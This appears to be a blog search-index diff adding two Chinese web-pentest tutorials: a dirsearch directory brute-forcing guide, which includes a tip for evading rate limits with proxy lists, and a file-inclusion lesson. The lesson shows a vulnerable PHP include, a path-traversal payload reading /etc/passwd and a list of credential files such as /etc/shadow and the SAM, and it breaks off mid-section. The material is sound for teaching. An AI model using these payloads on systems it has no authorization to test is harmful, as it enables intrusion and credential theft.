@@ -293,6 +293,465 @@
       </tags>
   </entry>
   <entry>
+    <title>dirsearch-路径扫描</title>
+    <url>/2022/dirsearch/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一款高级命令行工具，旨在暴力破解网络服务器中的目录和文件，AKA 网络路径扫描器。</p>
+<p>dirsearch进行高精度，可以扩展的扫描，可以根据自己的需求定义，相对于御剑，我个人认为更好点。</p>
+<p><a href="https://github.com/maurosoria/dirsearch">dirsearch工具地址</a></p>
+<span id="more"></span>    
+
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><ul>
+<li>使用 git 安装：<code>git clone https://github.com/maurosoria/dirsearch.git</code></li>
+<li>使用 ZIP 文件安装：<a href="https://github.com/maurosoria/dirsearch/archive/master.zip">在此处下载</a></li>
+<li>使用 Docker 安装：（<code>docker build -t &quot;dirsearch:v0.4.1&quot;</code>更多<a href="https://github.com/maurosoria/dirsearch#support-docker">信息</a>）</li>
+<li>使用 Kali Linux 安装：<code>sudo apt-get install dirsearch</code></li>
+<li>使用 PyPi 安装：<code>pip3 install dirsearch</code></li>
+</ul>
+<p>安装库</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/maurosoria/dirsearch.git</span><br><span class="line">cd dirsearch</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 dirsearch.py -u &lt;URL&gt; -e &lt;EXTENSIONS&gt;</span><br></pre></td></tr></table></figure>
+
+<p>requirements.txt 中包含了 dirsearch 中需要的库。</p>
+<h1 id="选项"><a href="#选项" class="headerlink" title="选项"></a>选项</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Usage: dirsearch.py [-u|--url] target [-e|--extensions] extensions [options]</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">  --version             显示程序的版本号并退出</span><br><span class="line">  -h, --<span class="built_in">help</span>            显示此帮助消息并退出</span><br><span class="line"></span><br><span class="line">  Mandatory: <span class="comment">#强制性的</span></span><br><span class="line">    -u URL, --url=URL   目标网址</span><br><span class="line">    -l FILE, --url-list=FILE</span><br><span class="line">                        目标URL列表文件</span><br><span class="line">    --stdin             来自STDIN的目标URL列表</span><br><span class="line">    --cidr=CIDR         目标CIDR</span><br><span class="line">    --raw=FILE          从文件加载原始HTTP请求 (use `--scheme` flag to <span class="built_in">set</span> the scheme)</span><br><span class="line">    -e EXTENSIONS, --extensions=EXTENSIONS</span><br><span class="line">                        用逗号分隔的扩展列表 (Example: php,asp)</span><br><span class="line">    -X EXTENSIONS, --exclude-extensions=EXTENSIONS</span><br><span class="line">                        排除由逗号分隔的扩展列表 (Example: asp,jsp)</span><br><span class="line">    -f, --force-extensions</span><br><span class="line">                        为每个单词列表条目添加扩展名。默认情况下dirsearch仅将%EXT%关键字替换为扩展</span><br><span class="line"></span><br><span class="line">  Dictionary Settings: <span class="comment">#字典设置</span></span><br><span class="line">    -w WORDLIST, --wordlists=WORDLIST</span><br><span class="line">                        自定义词表 (用逗号分隔)</span><br><span class="line">    --prefixes=PREFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义前缀 (用逗号分隔)</span><br><span class="line">    --suffixes=SUFFIXES</span><br><span class="line">                        向所有单词列表条目添加自定义后缀，忽略目录(用逗号分隔)</span><br><span class="line">    --only-selected     删除路径与选定路径具有不同的扩展名通过`-e的` (保留条目没有扩展名)</span><br><span class="line">    --remove-extensions</span><br><span class="line">                        删除所有路径中的扩展 (Example: admin.php -&gt; admin)</span><br><span class="line">    -U, --uppercase     Uppercase wordlist</span><br><span class="line">    -L, --lowercase     Lowercase wordlist</span><br><span class="line">    -C, --capital       Capital wordlist</span><br><span class="line"></span><br><span class="line">  General Settings: <span class="comment">#一般设置</span></span><br><span class="line">    -t THREADS, --threads=THREADS  线程数</span><br><span class="line">    -r, --recursive     暴力循环</span><br><span class="line">    --deep-recursive    对每个目录深度执行递归扫描</span><br><span class="line">                        (Example: api/users -&gt; api/)</span><br><span class="line">    --force-recursive   对每个找到的路径进行递归暴力，而不是只有路径以斜线结尾</span><br><span class="line">    --recursion-depth=DEPTH 最大递归深度</span><br><span class="line">    --recursion-status=CODES</span><br><span class="line">                        执行递归扫描的有效状态代码，支持范围 (用逗号分隔)</span><br><span class="line">    --subdirs=SUBDIRS   扫描给定URL的子目录 (用逗号分隔)</span><br><span class="line">    --exclude-subdirs=SUBDIRS</span><br><span class="line">                        在递归过程中排除以下子目录扫描 (用逗号分隔)</span><br><span class="line">    -i CODES, --include-status=CODES</span><br><span class="line">                        包括状态代码，用逗号分隔，支持范围 (Example: 200,300-399)</span><br><span class="line">    -x CODES, --exclude-status=CODES</span><br><span class="line">                        排除状态代码，用逗号分隔，支持范围 (Example: 301,500-599)</span><br><span class="line">    --exclude-sizes=SIZES</span><br><span class="line">                        按大小排除响应，以逗号分隔 (Example: 123B,4KB)</span><br><span class="line">    --exclude-texts=TEXTS</span><br><span class="line">                        按文本排除回复，用逗号分隔 (Example: <span class="string">&#x27;Not found&#x27;</span>, <span class="string">&#x27;Error&#x27;</span>)</span><br><span class="line">    --exclude-regexps=REGEXPS</span><br><span class="line">                        通过regexp排除响应，用逗号分隔</span><br><span class="line">                        (Example: <span class="string">&#x27;Not foun[a-z]&#123;1&#125;&#x27;</span>, <span class="string">&#x27;^Error$&#x27;</span>)</span><br><span class="line">    --exclude-redirects=REGEXPS</span><br><span class="line">                        通过重定向正则表达式或文本排除响应,</span><br><span class="line">                        用逗号分隔 (Example: <span class="string">&#x27;https://okta.com/*&#x27;</span>)</span><br><span class="line">    --exclude-content=PATH</span><br><span class="line">                        按此路径的响应内容排除响应</span><br><span class="line">    --skip-on-status=CODES</span><br><span class="line">                        无论何时命中其中一个状态码，跳过目标，用逗号分隔，支持范围</span><br><span class="line">    --minimal=LENGTH    最小响应长度</span><br><span class="line">    --maximal=LENGTH    最大响应长度</span><br><span class="line">    --max-time=SECONDS  扫描的最大运行时间</span><br><span class="line">    -q, --quiet-mode    安静模式</span><br><span class="line">    --full-url          输出中的完整URL (在中自动启用安静模式)</span><br><span class="line">    --no-color          没有彩色输出</span><br><span class="line"></span><br><span class="line">  Request Settings: <span class="comment">#请求设置</span></span><br><span class="line">    -m METHOD, --http-method=METHOD HTTP方法 (default: GET)</span><br><span class="line">    -d DATA, --data=DATA HTTP请求数据</span><br><span class="line">    -H HEADERS, --header=HEADERS</span><br><span class="line">                        HTTP请求头，支持多个标志 (Example:</span><br><span class="line">                        -H <span class="string">&#x27;Referer: example.com&#x27;</span>)</span><br><span class="line">    --header-list=FILE  文件包含HTTP请求头</span><br><span class="line">    -F, --follow-redirects</span><br><span class="line">                        遵循HTTP重定向</span><br><span class="line">    --random-agent      为每个请求选择一个随机用户代理</span><br><span class="line">    --auth-type=TYPE    身份验证类型 (basic, digest, bearer, ntlm)</span><br><span class="line">    --auth=CREDENTIAL   认证凭证 (user:password or bearer token)</span><br><span class="line">    --user-agent=USERAGENT</span><br><span class="line">    --cookie=COOKIE</span><br><span class="line"></span><br><span class="line">  Connection Settings: <span class="comment">#连接设置</span></span><br><span class="line">    --<span class="built_in">timeout</span>=TIMEOUT   连接超时</span><br><span class="line">    -s DELAY, --delay=DELAY</span><br><span class="line">                        请求之间的延迟</span><br><span class="line">    --proxy=PROXY       代理URL，支持HTTP和SOCKS代理 (Example:</span><br><span class="line">                        localhost:8080, socks5://localhost:8088)</span><br><span class="line">    --proxy-list=FILE   文件包含代理服务器</span><br><span class="line">    --replay-proxy=PROXY</span><br><span class="line">                        要使用找到的路径重播的代理</span><br><span class="line">    --scheme=SCHEME     默认方案 (对于原始请求或如果没有URL中的方案)</span><br><span class="line">    --max-rate=RATE     每秒最大请求数</span><br><span class="line">    --retries=RETRIES   失败请求的重试次数</span><br><span class="line">    -b, --request-by-hostname</span><br><span class="line">                        默认情况下，通过IP搜索速度请求。这将强制dirsearch按主机名请求</span><br><span class="line">    --ip=IP             服务器IP地址</span><br><span class="line">    --exit-on-error     每当发生错误时退出</span><br><span class="line"></span><br><span class="line">  Reports:</span><br><span class="line">    -o FILE, --output=FILE</span><br><span class="line">                        输出文件</span><br><span class="line">    --format=FORMAT     报告格式 (Available: simple, plain, json, xml,</span><br><span class="line">                        md, csv, html)</span><br></pre></td></tr></table></figure>
+
+<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>dirsearch 工具可以根据自己的需求进行配置，配置文件为 default.conf 。选择带 <code>#</code> 的进行配置。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># If you want to edit dirsearch default configurations, you can</span><br><span class="line"># edit values in this file. Everything after `#` is a comment</span><br><span class="line"># and won&#x27;t be applied</span><br><span class="line"></span><br><span class="line">[mandatory]</span><br><span class="line">default-extensions = php,aspx,jsp,html,js</span><br><span class="line">force-extensions = False</span><br><span class="line"># exclude-extensions = old,log</span><br><span class="line"></span><br><span class="line">[general]</span><br><span class="line">threads = 30</span><br><span class="line">recursive = False</span><br><span class="line">deep-recursive = False</span><br><span class="line">force-recursive = False</span><br><span class="line">recursion-depth = 0</span><br><span class="line">exclude-subdirs = %%ff/</span><br><span class="line">random-user-agents = False</span><br><span class="line">max-time = 0</span><br><span class="line">full-url = False</span><br><span class="line">quiet-mode = False</span><br><span class="line">color = True</span><br><span class="line">recursion-status = 200-399,401,403</span><br><span class="line"># include-status = 200-299,401</span><br><span class="line"># exclude-status = 400,500-999</span><br><span class="line"># exclude-sizes = 0b,123gb</span><br><span class="line"># exclude-texts = &quot;Not found&quot;</span><br><span class="line"># exclude-regexps = &quot;403 [a-z]&#123;1,25&#125;&quot;</span><br><span class="line"># exclude-content = 404.html</span><br><span class="line"># skip-on-status = 429,999</span><br><span class="line"></span><br><span class="line">[reports]</span><br><span class="line">report-format = plain</span><br><span class="line">autosave-report = True</span><br><span class="line"># report-output-folder = /home/user</span><br><span class="line"># logs-location = /tmp</span><br><span class="line">## Supported: plain, simple, json, xml, md, csv, html</span><br><span class="line"></span><br><span class="line">[dictionary]</span><br><span class="line">lowercase = False</span><br><span class="line">uppercase = False</span><br><span class="line">capitalization = False</span><br><span class="line"># prefixes = .,admin</span><br><span class="line"># suffixes = ~,.bak</span><br><span class="line"># wordlist = db/dicc.txt</span><br><span class="line"></span><br><span class="line">[request]</span><br><span class="line">httpmethod = get</span><br><span class="line">## Lowercase only</span><br><span class="line">follow-redirects = False</span><br><span class="line"># headers-file = headers.txt</span><br><span class="line"># user-agent = MyUserAgent</span><br><span class="line"># cookie = SESSIONID=123</span><br><span class="line"></span><br><span class="line">[connection]</span><br><span class="line">timeout = 5</span><br><span class="line">delay = 0</span><br><span class="line">scheme = http</span><br><span class="line">maxrate = 0</span><br><span class="line">retries = 2</span><br><span class="line">request-by-hostname = False</span><br><span class="line">exit-on-error = False</span><br><span class="line"># proxy = localhost:8080</span><br><span class="line"># proxy-list = proxies.txt</span><br><span class="line"># replay-proxy = localhost:8000</span><br></pre></td></tr></table></figure>
+
+<h1 id="命令-使用"><a href="#命令-使用" class="headerlink" title="命令-使用"></a>命令-使用</h1><h2 id="简单扫描"><a href="#简单扫描" class="headerlink" title="简单扫描"></a>简单扫描</h2><p>对 URL 进行扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target</span><br></pre></td></tr></table></figure>
+
+<p>扫描固定后缀文件的 URL</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target</span><br></pre></td></tr></table></figure>
+
+<p>定义字典扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -w /path/to/wordlist</span><br></pre></td></tr></table></figure>
+
+<h2 id="暂停扫描"><a href="#暂停扫描" class="headerlink" title="暂停扫描"></a>暂停扫描</h2><p>dirsearch 允许您使用 CTRL+C 暂停扫描进度，从这里，您可以保存进度（稍后继续）、跳过当前目标或跳过当前子目录。</p>
+<p><img src="/2022/dirsearch/pause.png"></p>
+
+
+<h2 id="递归扫描"><a href="#递归扫描" class="headerlink" title="递归扫描"></a>递归扫描</h2><ul>
+<li>通过使用**-r | –recursive**参数，dirsearch 将递归地暴力破解所有目录。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>您可以使用–recursion-depth</strong>设置最大递归深度，使用–recursion <strong>-</strong> status 设置递归状态码</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target -r --recursion-depth 3 --recursion-status 200-399</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>还有 2 个选项：</p>
+<p><strong>–force-recursive</strong> 和 <strong>–deep-recursive</strong></p>
+<ul>
+<li><strong>强制递归</strong>：暴力递归所有找到的路径，而不仅仅是路径以<code>/</code></li>
+<li><strong>深度递归</strong>：递归暴力破解路径的所有深度（<code>a/b/c</code>&#x3D;&gt; 添加<code>a/</code>，<code>a/b/</code>）</li>
+</ul>
+</li>
+</ul>
+<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程号 ( <strong>-t | –threads</strong> ) 反映了分离的蛮力进程的数量。所以线程数越大，dirsearch 运行得越快。默认情况下，线程数为 30，但如果您想加快进度，可以增加它。</p>
+<p>速度仍然很大程度上取决于服务器的响应时间。如果你的线程过大可能导致Dos</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,htm,js,bak,zip,tgz,txt -u https://target -t 20</span><br></pre></td></tr></table></figure>
+
+<h2 id="前缀-x2F-后缀"><a href="#前缀-x2F-后缀" class="headerlink" title="前缀&#x2F;后缀"></a>前缀&#x2F;后缀</h2><p>自定义扫描文件前缀或者后缀</p>
+<ul>
+<li><strong>–prefixes</strong>：为所有条目添加自定义前缀</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --prefixes .,admin,_</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tools</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">.tools</span><br><span class="line">admintools</span><br><span class="line">_tools</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–suffixes</strong>：为所有条目添加自定义后缀</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --suffixes ~</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php</span><br><span class="line">internal</span><br><span class="line"></span><br><span class="line">生成</span><br><span class="line"></span><br><span class="line">index.php~</span><br><span class="line">internal~</span><br></pre></td></tr></table></figure>
+
+<h2 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h2><p>在<code>db/</code>文件夹内，有几个“黑名单文件”。如果这些文件中的路径与文件名中提到的状态相同，则将从扫描结果中过滤掉它们。</p>
+<p>示例：如果您添加<code>admin.php</code>到<code>db/403_blacklist.txt</code>，每当您执行<code>admin.php</code>返回 403 的扫描时，都会从结果中过滤掉。</p>
+<h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>使用**-i | –include-status<strong>和</strong>-x | –exclude-status**选择允许和不允许的响应状态码</p>
+<p>对于更高级的过滤器：</p>
+<ul>
+<li><strong>–exclude-sizes</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-sizes 1B,243KB</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–exclude-texts</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-texts &quot;403 Forbidden&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–exclude-regexps</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-regexps &quot;^Error$&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>–exclude-redirects</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-redirects &quot;https://(.*).okta.com/*&quot;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>-exclude-content</strong></li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --exclude-content /error.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="原始请求"><a href="#原始请求" class="headerlink" title="原始请求"></a>原始请求</h2><p><strong>dirsearch</strong> 允许您从文件中导入原始请求。内容看起来像这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: admin.example.com</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Accept: */*</span><br></pre></td></tr></table></figure>
+
+<h2 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h2><p>既然扫描网站，我们也可以选择使用 GET 或者 POST 方法</p>
+<p>但是在 post 方法中，POST 是万维网使用的 HTTP 支持的请求方法。POST 请求方法在设计上要求 Web 服务器接受包含在请求消息正文中的数据，最有可能存储它。它通常与 GET HTTP 方法一起使用，该方法在名称或值对中用于将表单数据附加到 URL。如果您使用 GET，则 URL 长度将受到限制。这使用户能够提交书签的结果。</p>
+<p>现在，我们正在使用此命令在 [-m] 参数的帮助下探索另一面。</p>
+<p>正如我们所知，与我们之前执行的 GET 请求方法相比，这些结果是不同且独特的。它显示了一些不同的网页和网页目录。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -m POST</span><br></pre></td></tr></table></figure>
+
+<h2 id="延迟请求"><a href="#延迟请求" class="headerlink" title="延迟请求"></a>延迟请求</h2><p>根据规则，或者限制，延迟自己的请求，免除造成不必要的网络拥堵</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ -s 10</span><br></pre></td></tr></table></figure>
+
+<h2 id="词表格式"><a href="#词表格式" class="headerlink" title="词表格式"></a>词表格式</h2><p>支持的词表格式：大写、小写、大写</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小写</span><br><span class="line">admin</span><br><span class="line">index.html</span><br><span class="line">大写</span><br><span class="line">ADMIN</span><br><span class="line">INDEX.HTML</span><br><span class="line">首部</span><br><span class="line">Admin</span><br><span class="line">Index.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="排除扩展"><a href="#排除扩展" class="headerlink" title="排除扩展"></a>排除扩展</h2><ul>
+<li>使用**-X | –exclude-extensions**带有扩展名列表将删除单词列表中包含给定扩展名的所有路径</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u https://target -X jsp</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin.php</span><br><span class="line">test.jsp</span><br><span class="line"></span><br><span class="line">扫描后：</span><br><span class="line">admin.php</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>如果要排除所有扩展名，除了您在<code>-e</code>标志中选择的扩展名，请使用**–only-selected**</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e html -u https://target --only-selected</span><br></pre></td></tr></table></figure>
+
+<p>例子</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">index.html</span><br><span class="line">admin.php</span><br><span class="line">扫描后</span><br><span class="line">index.html</span><br></pre></td></tr></table></figure>
+
+<h2 id="扫描子目录"><a href="#扫描子目录" class="headerlink" title="扫描子目录"></a>扫描子目录</h2><ul>
+<li><strong>从 URL，您可以使用–subdirs</strong>扫描子目录列表。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --subdirs admin/,folder/,/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>它的反向版本是**–exclude-subdirs**，它可以防止 dirsearch 递归扫描给定的子目录。</li>
+</ul>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --recursive --exclude-subdirs image/,css/</span><br></pre></td></tr></table></figure>
+
+<h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><p>dirsearch 支持 SOCKS 和 HTTP 代理，有两个选项：代理服务器或代理服务器列表。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxy socks5://10.10.0.1:8080</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php,html,js -u https://target --proxylist proxyservers.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="报告"><a href="#报告" class="headerlink" title="报告"></a>报告</h2><p>支持的报告格式：<strong>simple</strong>、<strong>plain</strong>、<strong>json</strong>、<strong>xml</strong>、<strong>md</strong>、<strong>csv</strong>、 <strong>html</strong></p>
+<p>将扫描变成报告输出出来</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -l URLs.txt --format plain -o report.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -e php -u https://target --format html -o target.json</span><br></pre></td></tr></table></figure>
+
+<h2 id="没色扫描"><a href="#没色扫描" class="headerlink" title="没色扫描"></a>没色扫描</h2><p>扫描结果是没有颜色的，看个人喜好，毕竟有人喜欢花里胡哨</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http://testphp.vulnweb.com/ --no-color</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="扫描方法"><a href="#扫描方法" class="headerlink" title="扫描方法"></a>扫描方法</h2><ul>
+<li>服务器有请求限制？这很糟糕，但随意绕过它，通过随机代理<code>--proxy-list</code></li>
+<li>想要找出配置文件或备份？尝试<code>--suffixes ~</code>并<code>--prefixes .</code></li>
+<li>只想查找文件夹&#x2F;目录？为什么不结合<code>--remove-extensions</code>和<code>--suffixes /</code>！</li>
+<li>使用 CIDR 进行暴力破解时，混合使用<code>--cidr</code>、和 将减少大部分噪音 + 假阴性<code>-F``-q</code></li>
+<li>扫描 URL 列表，但不想看到 429 泛滥？<code>--skip-on-status 429</code>将帮助您在返回 429 时跳过目标</li>
+<li>服务器包含会减慢扫描速度的大文件？您<em>可能</em>想使用<code>HEAD</code>HTTP 方法而不是<code>GET</code></li>
+<li>蛮力 CIDR 很慢？可能您忘记减少请求超时和请求重试。建议:<code>--timeout 3 --retries 1</code></li>
+</ul>
+]]></content>
+      <categories>
+        <category>web渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>工具</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文件包含漏洞</title>
+    <url>/2022/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>文件包含是指会在单个文件写入需要重复使用的函数，在需要使用的时候就直接调用此文件，这种文件调用的过程一般被称为文件包含。文件包含分为本地文件包含和远程文件包含，说明如下：</p>
+<ul>
+<li>当被包含的文件在服务器本地时，称为本地文件包含。</li>
+<li>当被包含的文件在第三方服务器时，称为远程文件包含。</li>
+</ul>
+<span id="more"></span>
+
+<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>由于开发人员没对文件名设置严格的规则，和其服务器上的没有过滤掉这些恶意文件，导致带有恶意代码的文件进入被包含进服务器中，从而形成了文件包含漏洞。</p>
+<h2 id="PHP中引发漏洞的函数"><a href="#PHP中引发漏洞的函数" class="headerlink" title="PHP中引发漏洞的函数"></a>PHP中引发漏洞的函数</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(): 表达式包含并运行指定文件</span><br><span class="line"><span class="keyword">include_once</span>(): 表达式包含并运行指定重复运行的文件</span><br><span class="line"><span class="keyword">require</span>():</span><br><span class="line"><span class="keyword">require_once</span>(): PHP会检查该文件是否已经被包含过，如果是则不会再次包含。</span><br></pre></td></tr></table></figure>
+
+<p>include() 函数在包含中出现错误，会警告一次，但是代码会继续运行，require() 函数它与 include 函数几乎一样，区别是它运行错误就会中止脚本。</p>
+<h1 id="漏洞分类"><a href="#漏洞分类" class="headerlink" title="漏洞分类"></a>漏洞分类</h1><h2 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h2><p><strong>类似代码</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="读取敏感信息"><a href="#读取敏感信息" class="headerlink" title="读取敏感信息"></a><strong>读取敏感信息</strong></h3><p>本地无限制读取，服务器没有过滤敏感信息。</p>
+<p><strong>Exp:</strong></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">url/flie.php?filename=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p>常见敏感信息路径：路径也可能因为版本的更新而更改</p>
+<table>
+<thead>
+<tr>
+<th>Windows系统路径</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>c:\boot.ini</td>
+<td>查看系统版本</td>
+</tr>
+<tr>
+<td>c:\windows\system32\inetsrv\MetaBase.xml</td>
+<td>IIS配置文件</td>
+</tr>
+<tr>
+<td>c:\windows\repair\sam</td>
+<td>存储Windows系统初次安装的密码</td>
+</tr>
+<tr>
+<td>c:\ProgramFiles\mysql\my.ini</td>
+<td>MySQL配置</td>
+</tr>
+<tr>
+<td>c:\ProgramFiles\mysql\data\mysql\user.MYD</td>
+<td>MySQL root密码</td>
+</tr>
+<tr>
+<td>windows系统</td>
+<td>php 配置信息</td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>Linux&#x2F;Unix系统路径</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;etc&#x2F;passwd</td>
+<td>账户信息</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;shadow</td>
+<td>账户密码文件</td>
+</tr>
+<tr>
+<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</td>
+<td>Apache2默认配置文件</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</td>
+<td>虚拟网站配置</td>
+</tr>
+<tr>
+<td>&#x2F;usr&#x2F;local&#x2F;app&#x2F;php5&#x2F;lib&#x2F;php.ini</td>
+<td>PHP相关配置</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;passwd &#x2F;&#x2F; 账户信息</td>
+<td>Apache配置文件</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;my.conf</td>
+<td>mysql 配置文件</td>
+</tr>
+</tbody></table>
+<h3 id="Session漏洞利用"><a href="#Session漏洞利用" class="headerlink" title="Session漏洞利用"></a>Session漏洞利用</h3><ul>
+<li><strong>php中的session.upload_progress</strong></li>
+</ul>
+<p>前提：php版本 &gt; php5.4</p>
+<p>在php.ini中有几个默认选项</p>
+<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">session.upload_progress.enabled</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.cleanup</span> = <span class="literal">on</span></span><br><span class="line"><span class="attr">session.upload_progress.prefix</span> = <span class="string">&quot;upload_progress_&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.name</span> = <span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.freq</span> = <span class="string">&quot;1%&quot;</span></span><br><span class="line"><span class="attr">session.upload_progress.min_freq</span> = <span class="string">&quot;1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">session.use_strict_mode</span>=<span class="literal">off</span></span><br></pre></td></tr></table></figure>
+
+<p>详解配置</p>
